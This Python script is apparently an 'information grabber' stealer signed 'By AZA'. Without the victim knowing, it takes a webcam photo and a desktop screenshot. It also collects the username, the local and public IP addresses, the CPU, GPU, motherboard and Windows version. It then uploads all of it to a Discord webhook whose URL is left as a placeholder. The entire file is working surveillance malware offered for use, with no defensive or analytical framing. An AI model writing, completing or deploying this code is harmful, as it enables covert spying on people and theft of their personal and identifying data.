import requests
import socket
import pyautogui
from datetime import datetime
import time
import cv2
import os
import platform
import subprocess
import wmi
import mss
from PIL import Image
import webbrowser
from time import sleep

time.sleep(1)
#teke Pitcure With WebCam
cap = cv2.VideoCapture(0)


if not cap.isOpened():
    error1 = ("🔴Error: Unable to access webcam.")
    photo_path = None

else:
    print("Webcam ouverte avec succès.")

    ret, frame = cap.read()

    if ret:
        photo_path = "photo_webcam.png"
        cv2.imwrite(photo_path, frame)

cap.release()


#take PC Info
c = wmi.WMI()

#Processeur
cpu = platform.processor()

#GPU
gpu = c.Win32_VideoController()[0].Name

#mother board
baseboard = c.Win32_BaseBoard()[0]
motherboard = f"{baseboard.Manufacturer} {baseboard.Product}"


windows_version = platform.platform()

#take more information
time = str(datetime.now())
ip_locale = socket.gethostbyname(socket.gethostname())
ip_publique = requests.get('https://api.ipify.org').text
name_of_user = os.getenv("USERNAME")


#take Desktop
with mss.mss() as sct:
    monitor = sct.monitors[0]
    screenshot = sct.grab(monitor)
    img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
    image_path = "screen.png"
    img.save(image_path)





def send_discord_webhook(webhook_url, message, image_paths):
    
    files = []
    for i, path in enumerate(image_paths):
        try:
            with open(path, 'rb') as image_file:
                files.append((f'file{i}', (path, image_file.read(), 'image/png')))
        except Exception as e:
            print(f"Erreur lors de l'ouverture du fichier {path} :", e)

    payload = {
        "content": message
    }

    try:
        response = requests.post(webhook_url, data=payload, files=files)
        if response.status_code in [200, 204]:
            print("✅ Message et images envoyés avec succès.")
        else:
            print(f"❌ Erreur lors de l'envoi. Code HTTP : {response.status_code}")
            print("Réponse :", response.text)
    except requests.exceptions.RequestException as e:
        print("🚫 Une erreur s'est produite :", e)





if __name__ == "__main__":
    webhook_url = "WebHook URL"
    
    message = f"# Information grabber\n**⏲️Hour:** {time} \n**🛜IP private:** {ip_locale} \n**📶IP public:** {ip_publique} \n**🚹Name User:** {name_of_user} \n **🧠CPU:** {cpu}\n**🎮GPU: **{gpu}\n **🧩MotherBoard: **{baseboard}\n**Version of Windows: **{windows_version}\n## 📸Screenshot: \n By aza"


    
    send_discord_webhook(webhook_url, message, [image_path,photo_path])



    

#By AZA